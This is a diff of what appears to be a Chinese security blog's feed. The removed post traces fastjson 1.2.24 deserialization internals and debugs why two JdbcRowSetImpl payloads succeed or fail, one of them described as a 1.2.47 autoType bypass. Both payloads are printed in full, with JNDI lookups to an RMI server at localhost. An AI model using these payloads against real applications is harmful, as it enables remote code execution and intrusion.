-        &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arraycopy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;
-   
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801170946844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172125235.png&quot; alt=&quot;&quot; /&gt;
-fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349&lt;/p&gt;
-
-&lt;p&gt;从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172503527.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172650015.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172727278.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)&lt;/p&gt;
-
-&lt;p&gt;判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174009759.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173758418.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173855503.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;之后会根据clazz获取deserializer进行反序列化&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174629869.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;用asm来生成处理类的情况：&lt;/p&gt;
-
-&lt;p&gt;也就是当asmEnable为true的情况&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801180314902.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801202503290.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;为什么要有autotype功能&quot;&gt;为什么要有autoType功能&lt;/h2&gt;
-
-&lt;p&gt;在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问&lt;/p&gt;
-
-&lt;p&gt;https://github.com/alibaba/fastjson/issues/3218&lt;/p&gt;
-
-&lt;p&gt;当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息&lt;/p&gt;
-
-&lt;h2 id=&quot;遇到的问题&quot;&gt;遇到的问题&lt;/h2&gt;
-
-&lt;p&gt;测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功&lt;/p&gt;
-
-&lt;p&gt;使用payload1&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1&lt;/p&gt;
-
-&lt;p&gt;调用栈&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser)
-parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser)
-parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
-parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
-parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser)
-parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
-parseObject:339, JSON (com.alibaba.fastjson)
-parseObject:243, JSON (com.alibaba.fastjson)
-parseObject:456, JSON (com.alibaba.fastjson)
-main:41, test (test)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;看了一下，是因为执行这条语句是contextArrayIndex为0导致的&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801205641550.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}&lt;/li&gt;
-  &lt;li&gt;{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true}&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;所以导致数组越界&lt;/p&gt;
-
-&lt;p&gt;再调试另一种payload&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在&lt;/p&gt;
-
-&lt;p&gt;deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)&lt;/p&gt;
-
-&lt;p&gt;下面是调用堆栈&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser)
-setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser)
-deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
-deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
-parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
-parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
-deserialze:105, StringCodec (com.alibaba.fastjson.serializer)
-deserialze:87, StringCodec (com.alibaba.fastjson.serializer)
-parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
-parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
-parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
-parseObject:339, JSON (com.alibaba.fastjson)
-parseObject:243, JSON (com.alibaba.fastjson)
-parseObject:456, JSON (com.alibaba.fastjson)
-main:41, test (test)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错&lt;/p&gt;
-
-&lt;p&gt;感觉像是代码的bug&lt;/p&gt;
-
-&lt;p&gt;验证：&lt;/p&gt;
-
-&lt;p&gt;通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败&lt;/p&gt;
-
-&lt;p&gt;1.2.47：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233523275.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;1.2.24：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801233548941.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="java" /><summary type="html">本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧 分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松 调试用的代码 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; Group group = JSON.parseObject(jsonString, Group.class); 从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner JSONScanner JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部 JSONLexerBase有几个成员变量 protected int token; protected int pos; protected int features; protected char ch; protected int bp;//当前指向的位置 protected int eofPos; /** * A character buffer for literals. */ protected char[] sbuf; protected int sp; /** * number start position */ protected int np; 同时JSONScanner也新定义了两个 private final String text; //反序列化的字符串 private final int len;//字符串长度 //将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符 public final char next() { int index = ++bp; return ch = (index &amp;gt;= this.len ? // EOI // : text.charAt(index)); } JSONScanner的初始化 public JSONScanner(String input, int features){ super(features); text = input; len = text.length(); bp = -1; next(); if (ch == 65279) { // utf-8 bom next(); } } DefaultJSONParser 不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化 在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建 进入这个函数 public ObjectDeserializer getDeserializer(Type type) { //首先会在已有的deserializer中找，this.derializers是一个hashmap ObjectDeserializer derializer = this.derializers.get(type); if (derializer != null) { return derializer; } //没有找着就接着找 if (type instanceof Class&amp;lt;?&amp;gt;) { return getDeserializer((Class&amp;lt;?&amp;gt;) type, type); } ………………省略…………………… } 进入getDeserializer的另一个重载，这个函数首先会匹配type的类型，否则会检查是否是泛型相关接口。然后检查反序列化的目标类是否在denyList中 public ObjectDeserializer getDeserializer(Class&amp;lt;?&amp;gt; clazz, Type type) { //继续匹配 ObjectDeserializer derializer = derializers.get(type); if (derializer != null) { return derializer; } if (type == null) { type = clazz; } //继续匹配 derializer = derializers.get(type); if (derializer != null) { return derializer; } { JSONType annotation = clazz.getAnnotation(JSONType.class); if (annotation != null) { Class&amp;lt;?&amp;gt; mappingTo = annotation.mappingTo(); if (mappingTo != Void.class) { return getDeserializer(mappingTo, mappingTo); } } } //判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道 if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) { derializer = derializers.get(clazz); } if (derializer != null) { return derializer; } //反序列化的类是否在denyList中 String className = clazz.getName(); className = className.replace('$', '.'); for (int i = 0; i &amp;lt; denyList.length; ++i) { String deny = denyList[i]; if (className.startsWith(deny)) { throw new JSONException(&quot;parser deny : &quot; + className); } } 之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer 如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false 先跟进asm为false的情况，直接new一个JavaBeanDeserializer JavaBeanDeserializer //其中定义的一些成员变量 private final FieldDeserializer[] fieldDeserializers; protected final FieldDeserializer[] sortedFieldDeserializers; protected final Class&amp;lt;?&amp;gt; clazz; public final JavaBeanInfo beanInfo; private ConcurrentMap&amp;lt;String, Object&amp;gt; extraFieldDeserializers; com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法 最后返回一个JavaBeanInfo类 在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields public JavaBeanInfo(Class&amp;lt;?&amp;gt; clazz, // Class&amp;lt;?&amp;gt; builderClass, // Constructor&amp;lt;?&amp;gt; defaultConstructor, // Constructor&amp;lt;?&amp;gt; creatorConstructor, // Method factoryMethod, // Method buildMethod, // JSONType jsonType, // List&amp;lt;FieldInfo&amp;gt; fieldList){ this.clazz = clazz; this.builderClass = builderClass; this.defaultConstructor = defaultConstructor; this.creatorConstructor = creatorConstructor; this.factoryMethod = factoryMethod; this.parserFeatures = TypeUtils.getParserFeatures(clazz); this.buildMethod = buildMethod; ....省略..... fields = new FieldInfo[fieldList.size()]; fieldList.toArray(fields); FieldInfo[] sortedFields = new FieldInfo[fields.length]; System.arraycopy(fields, 0, sortedFields, 0, fields.length); Arrays.sort(sortedFields); ....省略..... } 在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中 至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化 fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349 从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值 当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理 之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object) 判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析 当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader) 之后会根据clazz获取deserializer进行反序列化 用asm来生成处理类的情况： 也就是当asmEnable为true的情况 截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了 为什么要有autoType功能 在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问 https://github.com/alibaba/fastjson/issues/3218 当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息 遇到的问题 测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功 使用payload1 String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1 调用栈 popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser) parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 看了一下，是因为执行这条语句是contextArrayIndex为0导致的 经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是 {&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;} {&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true} 所以导致数组越界 再调试另一种payload String jsonString = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;; 少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在 deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) 下面是调用堆栈 addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser) setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:105, StringCodec (com.alibaba.fastjson.serializer) deserialze:87, StringCodec (com.alibaba.fastjson.serializer) parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:339, JSON (com.alibaba.fastjson) parseObject:243, JSON (com.alibaba.fastjson) parseObject:456, JSON (com.alibaba.fastjson) main:41, test (test) 所以猜测在第一种payload调用deserializer.deserialze(this, clazz, fieldName);时本来应该有一次setContext，但是他没有，所以报错 感觉像是代码的bug 验证： 通过找资料发现第一种payload实际上是1.2.47的一个绕过，于是下载了1.2.47的源码进行调试，发现1.2.47在parseObject函数中调用popContext的地方加了更多的判断使反序列化java.lang.Class类时不执行popContext，因此1.2.24实际上是多了一次popContext导致的失败 1.2.47： 1.2.24：</summary></entry></feed>
+&lt;p&gt;想要更好的使用工具或者开发自己的工具就需要深入了解其内部的机制&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。</summary></entry></feed>
